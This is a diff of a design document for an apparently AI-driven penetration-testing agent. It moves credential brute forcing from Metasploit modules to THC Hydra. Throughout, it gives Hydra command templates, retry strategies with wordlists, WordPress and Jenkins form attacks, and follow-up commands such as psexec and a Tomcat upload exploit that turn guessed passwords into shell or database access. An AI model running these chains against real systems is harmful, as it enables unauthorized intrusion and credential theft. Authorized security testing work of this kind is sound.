@@ -286,173 +286,246 @@ auxiliary/
 
 ---
 
-## Category 2: Brute Force / Credential Attacks
+## Category 2: Brute Force / Credential Attacks (CURRENT — THC Hydra)
 
-**Description**: Password guessing attacks against authentication services.
+**Description**: Password guessing attacks against authentication services using THC Hydra. This is a fully implemented attack path — classified as `brute_force_credential_guess` by the LLM router.
 
-**Entry Detection Keywords**: `brute`, `password`, `credential`, `login`, `crack`, `spray`, `guess`, `dictionary`
+**Tool**: `execute_hydra` (NOT `metasploit_console` — Hydra replaced all Metasploit `auxiliary/scanner/*/login` modules)
 
-**Workflow**:
-```
-┌─────────────────────────────────────────────────────────────────┐
-│              BRUTE FORCE ATTACK CHAIN                            │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                  │
-│  1. use auxiliary/scanner/<proto>/<proto>_login                 │
-│                                                                  │
-│  2. show options               → Display module options          │
-│                                                                  │
-│  3. set RHOSTS <target>        → Target IP/range                 │
-│  4. set RPORT <port>           → Target port (if non-default)    │
-│                                                                  │
-│  5. Credential configuration (choose one):                       │
-│     a) Single credential:                                        │
-│        - set USERNAME <user>                                     │
-│        - set PASSWORD <pass>                                     │
-│     b) User list:                                                │
-│        - set USER_FILE /path/to/users.txt                       │
-│        - set PASS_FILE /path/to/passwords.txt                   │
-│     c) Combined file:                                            │
-│        - set USERPASS_FILE /path/to/creds.txt                   │
-│                                                                  │
-│  6. set BRUTEFORCE_SPEED 3     → Speed (0=slow/stealth, 5=fast) │
-│  7. set STOP_ON_SUCCESS true   → Stop when creds found          │
-│                                                                  │
-│  8. run                        → Execute (NOT "exploit")         │
-│                                                                  │
-└─────────────────────────────────────────────────────────────────┘
-```
+**Entry Detection Keywords**: `brute`, `password`, `credential`, `login`, `crack`, `spray`, `guess`, `dictionary`, `wordlist`
 
 **Key Differences from CVE Chain**:
-- Uses `run` not `exploit`
-- No TARGET selection
-- No PAYLOAD selection
-- Requires wordlists/credential configuration
+- Uses **THC Hydra** (stateless CLI tool) instead of Metasploit auxiliary modules
+- No interactive console — each attempt is a single `execute_hydra` call
+- No sessions — Hydra reports found credentials and exits; session establishment is a separate step
+- Configurable per-project via `HYDRA_*` settings in project settings
 
-### Metasploit Built-in Wordlists
+### Project Settings (Default Configuration)
 
-Metasploit includes a comprehensive collection of wordlists at:
+| Setting | Default | Description |
+|---------|---------|-------------|
+| `HYDRA_ENABLED` | `true` | Enable/disable Hydra tool |
+| `HYDRA_THREADS` | `16` | Default parallel connections (`-t`) |
+| `HYDRA_WAIT_BETWEEN_CONNECTIONS` | `0` | Delay between attempts (seconds, `-W`) |
+| `HYDRA_CONNECTION_TIMEOUT` | `32` | Timeout per connection (seconds) |
+| `HYDRA_STOP_ON_FIRST_FOUND` | `true` | Stop after first success (`-f`) |
+| `HYDRA_EXTRA_CHECKS` | `nsr` | Try null password, same-as-login, reversed (`-e nsr`) |
+| `HYDRA_VERBOSE` | `true` | Show each attempt (`-V`) |
+| `HYDRA_MAX_WORDLIST_ATTEMPTS` | `3` | Max retry attempts with different wordlists |
+
+These are compiled into pre-configured flags injected into every `execute_hydra` call:
 ```
-/usr/share/metasploit-framework/data/wordlists/
-```
-
-**General Purpose Wordlists**:
-| File | Description | Use Case |
-|------|-------------|----------|
-| `unix_passwords.txt` | Common Unix/Linux passwords | SSH, Telnet, FTP brute force |
-| `unix_users.txt` | Common Unix usernames | Username enumeration |
-| `password.lst` | General password list | Multi-protocol attacks |
-| `burnett_top_1024.txt` | Top 1024 most common passwords | Quick password spray |
-| `piata_ssh_userpass.txt` | SSH username:password combos | SSH-specific attacks |
-| `common_roots.txt` | Common root passwords | Privilege escalation attempts |
-
-**Service-Specific Wordlists**:
-| File | Service | Description |
-|------|---------|-------------|
-| `db2_default_userpass.txt` | IBM DB2 | Default DB2 credentials |
-| `tomcat_mgr_default_userpass.txt` | Apache Tomcat | Tomcat Manager defaults |
-| `oracle_default_userpass.txt` | Oracle DB | Oracle database defaults |
-| `postgres_default_userpass.txt` | PostgreSQL | PostgreSQL defaults |
-| `mssql_default_userpass.txt` | MSSQL | Microsoft SQL Server defaults |
-| `mirai_user.txt` / `mirai_pass.txt` | IoT devices | Mirai botnet credentials |
-| `snmp_default_pass.txt` | SNMP | Default SNMP community strings |
-| `vnc_passwords.txt` | VNC | Common VNC passwords |
-| `http_default_userpass.txt` | Web apps | HTTP Basic Auth defaults |
-
-**Updated Workflow with Built-in Wordlists**:
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│              BRUTE FORCE WITH METASPLOIT WORDLISTS                           │
-├─────────────────────────────────────────────────────────────────────────────┤
-│                                                                              │
-│  5. Credential configuration (choose one):                                   │
-│                                                                              │
-│     a) Using built-in general wordlists:                                     │
-│        - set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
-│        - set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
-│                                                                              │
-│     b) Using service-specific defaults (recommended for known services):     │
-│        - set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
-│                                                                              │
-│     c) Quick password spray (top 1024):                                      │
-│        - set PASS_FILE /usr/share/metasploit-framework/data/wordlists/burnett_top_1024.txt
-│                                                                              │
-│     d) SSH-specific combo file:                                              │
-│        - set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
-│                                                                              │
-└─────────────────────────────────────────────────────────────────────────────┘
+-t 16 -W 0 -f -e nsr -V
 ```
 
-**Listing Available Wordlists in msfconsole**:
+### Hydra Attack Chain Workflow
+
+```
+┌──────────────────────────────────────────────────────────────────────────┐
+│              BRUTE FORCE ATTACK CHAIN (THC Hydra)                        │
+├──────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  Step 0: GATHER TARGET CONTEXT                                           │
+│  ─────────────────────────────                                           │
+│  - Check target_info.technologies for OS/platform hints                  │
+│  - Query graph: "What technologies are detected on <target-ip>?"         │
+│  - Use naabu or SSH banner to identify service/OS if unclear             │
+│                                                                          │
+│  Step 1: SELECT HYDRA PROTOCOL                                           │
+│  ─────────────────────────────                                           │
+│  - Map target service → Hydra protocol string (see protocol table)       │
+│  - Apply protocol-specific thread limits (SSH: max 4, RDP: max 1)        │
+│  - Add -s PORT for non-default ports, -S for SSL/TLS                     │
+│                                                                          │
+│  Step 2: BUILD & EXECUTE HYDRA COMMAND                                   │
+│  ─────────────────────────────────────                                   │
+│  - Credential flags: -l/-L (user), -p/-P (pass), or -C (combo file)     │
+│  - Pre-configured flags from project settings                            │
+│  - Target: protocol://IP[:PORT]                                          │
+│  - Execute via execute_hydra tool (NOT metasploit_console)               │
+│                                                                          │
+│  Step 3: PARSE RESULTS & RETRY                                           │
+│  ─────────────────────────────                                           │
+│  - Success: "[port][proto] host: IP  login: USER  password: PASS"        │
+│  - Failure: "0 valid passwords found" → try next wordlist strategy       │
+│  - Retry up to HYDRA_MAX_WORDLIST_ATTEMPTS (default 3) times             │
+│                                                                          │
+│  Step 4: SESSION ESTABLISHMENT (after creds found)                       │
+│  ─────────────────────────────────────────────────                       │
+│  - Hydra is stateless — does NOT create sessions                         │
+│  - Use kali_shell/metasploit_console to establish access manually        │
+│  - Transition to post_exploitation phase                                 │
+│                                                                          │
+└──────────────────────────────────────────────────────────────────────────┘
+```
+
+### Retry Strategy (3 Attempts)
+
+```
+┌──────────────────────────────────────────────────────────────────────────┐
+│              RETRY POLICY (per attack)                                    │
+├──────────────────────────────────────────────────────────────────────────┤
+│                                                                          │
+│  Attempt 1: OS-aware single username + common passwords                  │
+│  ─────────                                                               │
+│    Ubuntu:  -l ubuntu -P unix_passwords.txt                              │
+│    AWS:     -l ec2-user -P unix_passwords.txt                            │
+│    Generic: -l root -P common_roots.txt                                  │
+│    Windows: -l Administrator -P unix_passwords.txt                       │
+│                                                                          │
+│  Attempt 2: Comprehensive user list + password list                      │
+│  ─────────                                                               │
+│    -L unix_users.txt -P unix_passwords.txt                               │
+│                                                                          │
+│  Attempt 3: Service-specific combo file                                  │
+│  ─────────                                                               │
+│    SSH:     -C piata_ssh_userpass.txt                                    │
+│    Tomcat:  -C tomcat_mgr_default_userpass.txt                           │
+│    Postgres:-C postgres_default_userpass.txt                              │
+│                                                                          │
+└──────────────────────────────────────────────────────────────────────────┘
+```
+
+### Protocol Table
+
+#### 2.1 Network Service Brute Force
+
+| # | Attack Type | Service | Port | Hydra Protocol | Max `-t` | Notes |
+|---|-------------|---------|------|----------------|----------|-------|
+| 1 | **SSH Brute Force** | SSH | 22 | `ssh` | 4 | Connection rate limiting |
+| 2 | **FTP Brute Force** | FTP | 21 | `ftp` | default | |
+| 3 | **Telnet Brute Force** | Telnet | 23 | `telnet` | default | |
+| 4 | **SMB Brute Force** | SMB | 445 | `smb` | default | Supports `DOMAIN\user` |
+| 5 | **RDP Brute Force** | RDP | 3389 | `rdp` | 1 | Very slow, service crashes under load |
+| 6 | **VNC Brute Force** | VNC | 5900 | `vnc` | 4 | **Password-only**: `-p "" -P <file>` |
+| 7 | **SNMP Community Brute** | SNMP | 161 | `snmp` | default | Community string guessing |
+
+#### 2.2 Database Brute Force
+
+| # | Attack Type | Service | Port | Hydra Protocol | Notes |
+|---|-------------|---------|------|----------------|-------|
+| 8 | **MySQL Brute Force** | MySQL | 3306 | `mysql` | |
+| 9 | **MSSQL Brute Force** | MSSQL | 1433 | `mssql` | |
+| 10 | **PostgreSQL Brute Force** | PostgreSQL | 5432 | `postgres` | |
+| 11 | **Oracle Brute Force** | Oracle | 1521 | `oracle-listener` | |
+| 12 | **MongoDB Brute Force** | MongoDB | 27017 | `mongodb` | |
+| 13 | **Redis Auth Brute** | Redis | 6379 | `redis` | **Password-only**: `-p "" -P <file>` |
+
+#### 2.3 Email Service Brute Force
+
+| # | Attack Type | Service | Port | Hydra Protocol | Notes |
+|---|-------------|---------|------|----------------|-------|
+| 14 | **POP3 Brute Force** | POP3 | 110 | `pop3` | Use `-S` for POP3S (port 995) |
+| 15 | **IMAP Brute Force** | IMAP | 143 | `imap` | Use `-S` for IMAPS (port 993) |
+| 16 | **SMTP Brute Force** | SMTP | 25/587 | `smtp` | Use `-S` for SMTPS |
+
+#### 2.4 Web Application Brute Force
+
+| # | Attack Type | Service | Port | Hydra Protocol | Notes |
+|---|-------------|---------|------|----------------|-------|
+| 17 | **HTTP Basic Auth** | HTTP | 80/443 | `http-get` | Append path: `http-get://target/admin` |
+| 18 | **HTTP POST Form** | HTTP | 80/443 | `http-post-form` | Special syntax (see below) |
+| 19 | **Tomcat Manager** | Tomcat | 8080 | `http-get` | Path: `/manager/html` |
+| 20 | **WordPress Login** | WordPress | 80/443 | `http-post-form` | Analyze login form first |
+| 21 | **Jenkins Login** | Jenkins | 8080 | `http-post-form` | Path: `/j_acegi_security_check` |
+
+### HTTP POST Form Special Syntax
+
+For `http-post-form`, the target IP comes **before** the protocol, and the form spec uses colon `:` separators:
+
+```
+hydra -l admin -P passwords.txt <flags> <ip> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
+```
+
+**Form specification**: `"/path:POST_BODY:CONDITION"`
+- `^USER^` — username placeholder (replaced by Hydra)
+- `^PASS^` — password placeholder (replaced by Hydra)
+- `F=string` — **Failure** condition: response containing this string = login failed
+- `S=string` — **Success** condition: response containing this string = login succeeded
+- `H=Header: value` — Custom HTTP header
+- `C=/path` — Visit URL first for cookie gathering
+
+**Examples**:
 ```bash
-# From within msfconsole, find wordlists:
-ls /usr/share/metasploit-framework/data/wordlists/
+# WordPress
+-l admin -P passwords.txt <ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
 
-# Or search for specific type:
-ls /usr/share/metasploit-framework/data/wordlists/*pass*
-ls /usr/share/metasploit-framework/data/wordlists/*user*
+# Jenkins
+-l admin -P passwords.txt <ip> http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid"
+
+# Tomcat Manager (http-get with combo file)
+-C tomcat_mgr_default_userpass.txt http-get://<ip>:8080/manager/html
 ```
 
-### 2.1 Network Service Brute Force
+### Hydra Output Patterns
 
-| # | Attack Type | Service | Default Port | Metasploit Module |
-|---|-------------|---------|--------------|-------------------|
-| 1 | **SSH Brute Force** | SSH | 22 | `auxiliary/scanner/ssh/ssh_login` |
-| 2 | **FTP Brute Force** | FTP | 21 | `auxiliary/scanner/ftp/ftp_login` |
-| 3 | **Telnet Brute Force** | Telnet | 23 | `auxiliary/scanner/telnet/telnet_login` |
-| 4 | **SMB Brute Force** | SMB | 445 | `auxiliary/scanner/smb/smb_login` |
-| 5 | **RDP Brute Force** | RDP | 3389 | `auxiliary/scanner/rdp/rdp_scanner` |
-| 6 | **VNC Brute Force** | VNC | 5900 | `auxiliary/scanner/vnc/vnc_login` |
-| 7 | **WinRM Brute Force** | WinRM | 5985 | `auxiliary/scanner/winrm/winrm_login` |
-| 8 | **SNMP Community Brute** | SNMP | 161 | `auxiliary/scanner/snmp/snmp_login` |
-| 9 | **LDAP Brute Force** | LDAP | 389 | `auxiliary/scanner/ldap/ldap_login` |
-| 10 | **Kerberos Brute Force** | Kerberos | 88 | `auxiliary/scanner/kerberos/kerberos_login` |
+| Output Pattern | Meaning |
+|---------------|---------|
+| `[22][ssh] host: 10.0.0.5   login: root   password: toor` | **SUCCESS** — credentials found |
+| `1 of 1 target successfully completed, 1 valid password found` | Confirmation of success |
+| `0 valid passwords found` | **FAILED** — try next wordlist strategy |
+| `[ERROR] target ssh://... does not support password authentication` | Wrong auth method (e.g., key-only SSH) |
+| `[ERROR] could not connect to ssh://...` | Target unreachable or port closed |
+| `[WARNING] ... restoring connection` | Thread count too high — reduce `-t` |
 
-### 2.2 Database Brute Force
+### Available Wordlists
 
-| # | Attack Type | Service | Default Port | Metasploit Module |
-|---|-------------|---------|--------------|-------------------|
-| 11 | **MySQL Brute Force** | MySQL | 3306 | `auxiliary/scanner/mysql/mysql_login` |
-| 12 | **MSSQL Brute Force** | MSSQL | 1433 | `auxiliary/scanner/mssql/mssql_login` |
-| 13 | **PostgreSQL Brute Force** | PostgreSQL | 5432 | `auxiliary/scanner/postgres/postgres_login` |
-| 14 | **Oracle Brute Force** | Oracle | 1521 | `auxiliary/scanner/oracle/oracle_login` |
-| 15 | **MongoDB Brute Force** | MongoDB | 27017 | `auxiliary/scanner/mongodb/mongodb_login` |
-| 16 | **Redis Auth Brute** | Redis | 6379 | `auxiliary/scanner/redis/redis_login` |
-| 17 | **Cassandra Brute Force** | Cassandra | 9042 | `auxiliary/scanner/cassandra/cassandra_login` |
+**Location**: `/usr/share/metasploit-framework/data/wordlists/`
 
-### 2.3 Email Service Brute Force
+**General Purpose**:
+| File | Hydra Flag | Description |
+|------|-----------|-------------|
+| `unix_users.txt` | `-L` | Common Unix usernames (~170 entries) |
+| `unix_passwords.txt` | `-P` | Common Unix passwords (~1000 entries) |
+| `password.lst` | `-P` | General password list (~2000 entries) |
+| `burnett_top_1024.txt` | `-P` | Top 1024 most common passwords |
+| `burnett_top_500.txt` | `-P` | Top 500 most common passwords |
+| `common_roots.txt` | `-P` | Common root passwords |
+| `keyboard-patterns.txt` | `-P` | Keyboard patterns (qwerty, 123456, etc.) |
 
-| # | Attack Type | Service | Default Port | Metasploit Module |
-|---|-------------|---------|--------------|-------------------|
-| 18 | **POP3 Brute Force** | POP3 | 110 | `auxiliary/scanner/pop3/pop3_login` |
-| 19 | **IMAP Brute Force** | IMAP | 143 | `auxiliary/scanner/imap/imap_login` |
-| 20 | **SMTP Brute Force** | SMTP | 25 | `auxiliary/scanner/smtp/smtp_login` |
+**Service-Specific**:
+| File | Hydra Flag | Service |
+|------|-----------|---------|
+| `piata_ssh_userpass.txt` | `-C` | SSH user:pass combos |
+| `root_userpass.txt` | `-C` | Root credentials |
+| `tomcat_mgr_default_userpass.txt` | `-C` | Tomcat Manager combos |
+| `tomcat_mgr_default_pass.txt` | `-P` | Tomcat Manager passwords |
+| `postgres_default_userpass.txt` | `-C` | PostgreSQL combos |
+| `oracle_default_userpass.txt` | `-C` | Oracle DB combos |
+| `db2_default_userpass.txt` | `-C` | IBM DB2 combos |
+| `http_default_userpass.txt` | `-C` | HTTP Basic Auth combos |
+| `http_owa_common.txt` | `-P` | Outlook Web Access passwords |
+| `vnc_passwords.txt` | `-P` | VNC passwords (password-only service) |
+| `snmp_default_pass.txt` | `-P` | SNMP community strings |
 
-### 2.4 Web Application Brute Force
+### Post-Credential Session Establishment
 
-| # | Attack Type | Service | Default Port | Metasploit Module |
-|---|-------------|---------|--------------|-------------------|
-| 21 | **HTTP Basic Auth Brute** | HTTP | 80/443 | `auxiliary/scanner/http/http_login` |
-| 22 | **WordPress Login Brute** | WordPress | 80/443 | `auxiliary/scanner/http/wordpress_login_enum` |
-| 23 | **Tomcat Manager Brute** | Tomcat | 8080 | `auxiliary/scanner/http/tomcat_mgr_login` |
-| 24 | **Jenkins Login Brute** | Jenkins | 8080 | `auxiliary/scanner/http/jenkins_login` |
-| 25 | **Joomla Login Brute** | Joomla | 80/443 | `auxiliary/scanner/http/joomla_login_enum` |
-| 26 | **Drupal Login Brute** | Drupal | 80/443 | `auxiliary/scanner/http/drupal_login_enum` |
-| 27 | **GitLab Login Brute** | GitLab | 80/443 | `auxiliary/scanner/http/gitlab_login` |
-| 28 | **phpMyAdmin Brute** | phpMyAdmin | 80/443 | `auxiliary/scanner/http/phpmyadmin_login` |
+Hydra is stateless — after finding credentials, access must be established manually:
 
-### 2.5 Credential Spraying (Multi-Account)
+| Service | Tool | Command |
+|---------|------|---------|
+| SSH | `kali_shell` | `sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no <user>@<ip> 'whoami && id && uname -a'` |
+| SMB | `metasploit_console` | `use exploit/windows/smb/psexec; set SMBUser <user>; set SMBPass <pass>; set RHOSTS <ip>; run` |
+| MySQL | `kali_shell` | `mysql -h <ip> -u <user> -p'<pass>' -e 'SELECT user(); SHOW DATABASES;'` |
+| PostgreSQL | `kali_shell` | `PGPASSWORD='<pass>' psql -h <ip> -U <user> -c 'SELECT current_user;'` |
+| FTP | `kali_shell` | `curl -u <user>:<pass> ftp://<ip>/` |
+| Redis | `kali_shell` | `redis-cli -h <ip> -a '<pass>' INFO` |
+| MongoDB | `kali_shell` | `mongosh --host <ip> -u <user> -p '<pass>' --eval 'db.adminCommand("listDatabases")'` |
+| VNC | `kali_shell` | `echo '<pass>' \| timeout 5 vncviewer <ip> -passwd /dev/stdin` |
+| Tomcat | `metasploit_console` | `use exploit/multi/http/tomcat_mgr_upload; set HttpUsername <user>; set HttpPassword <pass>; set RHOSTS <ip>; run` |
+| HTTP | `execute_curl` | Login with discovered credentials |
 
-| # | Attack Type | Description | Metasploit Module |
-|---|-------------|-------------|-------------------|
-| 29 | **SMB Password Spray** | Tests common passwords across accounts | `auxiliary/scanner/smb/smb_login` (with PASS_FILE) |
-| 30 | **OWA Password Spray** | Outlook Web Access spraying | `auxiliary/scanner/http/owa_login` |
-| 31 | **Lync/Skype Spray** | Microsoft Lync/Skype for Business | `auxiliary/scanner/http/lync_login` |
+### Implementation Files
 
-**Post-Exploitation**:
-- SSH: If `ssh_login` succeeds with `CreateSession: true`, get shell session
-- SMB: Use captured credentials with `psexec` or other SMB exploits
-- Database: Direct database access for data exfiltration
+| File | Purpose |
+|------|---------|
+| `agentic/prompts/brute_force_credential_guess_prompts.py` | Full Hydra workflow prompts, retry logic, templates |
+| `agentic/prompts/tool_registry.py` | `execute_hydra` tool definition (50+ protocols) |
+| `agentic/project_settings.py` | `HYDRA_*` settings, `get_hydra_flags_from_settings()` |
+| `mcp/servers/network_recon_server.py` | `execute_hydra` MCP tool (subprocess, progress tracking on port 8014) |
+| `agentic/state.py` | `AttackPathClassification` model (`brute_force_credential_guess`) |
+| `agentic/prompts/classification.py` | LLM classification keywords for brute force routing |
+| `agentic/prompts/stealth_rules.py` | Hydra **forbidden** in stealth mode |
 
 ---
 
